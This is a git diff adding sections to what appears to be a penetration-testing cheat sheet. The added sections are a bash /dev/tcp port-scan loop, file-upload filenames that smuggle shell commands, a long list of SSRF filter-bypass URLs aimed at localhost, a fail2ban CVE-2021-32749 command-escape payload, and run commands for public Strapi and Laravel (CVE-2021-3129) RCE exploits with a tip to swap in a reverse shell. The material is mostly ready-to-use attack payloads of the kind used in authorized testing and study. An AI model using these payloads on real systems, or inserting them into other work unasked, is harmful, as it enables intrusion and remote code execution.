@@ -444,6 +444,9 @@ $ python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666
 $ declare -a array=($(tail -n +2 /proc/net/tcp | cut -d":" -f"3"|cut -d" " -f"1")) && for port in ${array[@]}; do echo $((0x$port)); done
 $ declare -a array=($(tail -n +2 /proc/net/tcp | cut -d":" -f"3"|cut -d" " -f"1")) && for port in ${array[@]}; do echo $((0x$port)); done | sort | uniq
 $ https://www.commandlinefu.com/commands/view/15313/check-open-ports-without-netstat-or-lsof
+
+# Another Port Scanning
+$ for i in {1..65535};do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
 ```
 
 ### SQL Injection
@@ -1485,6 +1488,19 @@ $ https://portswigger.net/kb/issues/006000b0_source-code-disclosure
 $ https://www.acunetix.com/blog/articles/source-code-disclosure-dangerous/
 ```
 
+### File Upload
+
+```bash
+# RCE in Filename
+file$(whoami).jpg
+file`whoami`.jpg
+file;sleep 30;.jpg
+
+# References
+https://www.onsecurity.io/blog/file-upload-checklist/
+https://book.hacktricks.xyz/pentesting-web/file-upload
+```
+
 ### PowerShell Commands
 
 ```powershell
@@ -1645,7 +1661,6 @@ $ neo4j
 => Notes
 $ http://localhost:7474/
 $ neo4j:neo4j
-
 
 ```
 
@@ -2926,6 +2941,54 @@ $ https://vim.rtorr.com/
 # References
 ```
 
+### SSRF (Server Side Request Forgery)
+
+```bash
+# List
+http://127.0.0.1
+http://127.1
+http://0
+http://0.0.0.0
+http://localhost
+http://[::]
+http://[0000::1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://①②⑦.⓪.⓪.⓪
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://2130706433/
+http://017700000001
+http://3232235521/
+http://3232235777/
+http://0x7f000001/
+http://0xc0a80014/
+http://{domain}@127.0.0.1
+http://127.0.0.1#{domain}
+http://{domain}.127.0.0.1
+http://127.0.0.1/{domain}
+http://127.0.0.1/?d={domain}
+https://{domain}@127.0.0.1
+https://127.0.0.1#{domain}
+https://{domain}.127.0.0.1
+https://127.0.0.1/{domain}
+https://127.0.0.1/?d={domain}
+http://{domain}@localhost
+http://localhost#{domain}
+http://{domain}.localhost
+http://localhost/{domain}
+http://localhost/?d={domain}
+http://127.0.0.1%00{domain}
+http://127.0.0.1?{domain}
+http://127.0.0.1///{domain}
+https://127.0.0.1%00{domain}
+https://127.0.0.1?{domain}
+https://127.0.0.1///{domain}
+
+# References
+https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+```
+
 # C. SUID/CAP/SUDO/GROUP
 
 ### Python
@@ -3528,6 +3591,19 @@ https://www.exploit-db.com/exploits/48051
 perl exploit.pl LPE #local
 perl exploit.pl RCE 10.0.0.162 10.0.0.24 example.org
 ```
+
+### CVE-2021-32749
+
+```bash
+# Payload
+~! <command>
+~! bash
+
+# Referemces
+https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm
+https://hackmyvm.eu/machines/machine.php?vm=Texte
+```
+
 
 ### PHP Info + LFI
 
@@ -4140,6 +4216,23 @@ $ python3 exploit.py listPics 10.10.10.10
 
 => References
 $ https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566
+```
+
+### Strapi
+
+```bash
+# RCE 
+https://www.exploit-db.com/exploits/50239
+=> python3 exploit.py http://localhost/
+```
+
+### Laravel
+
+```bash
+# Laravel Debug RCE (CVE-2021-3129)
+https://github.com/zhzyker/CVE-2021-3129
+=> python3 exp.py http://localhost:8000/
+=> To get reverse shell change `id` to any reverse shell
 ```
 
 # F. Bug Bounty
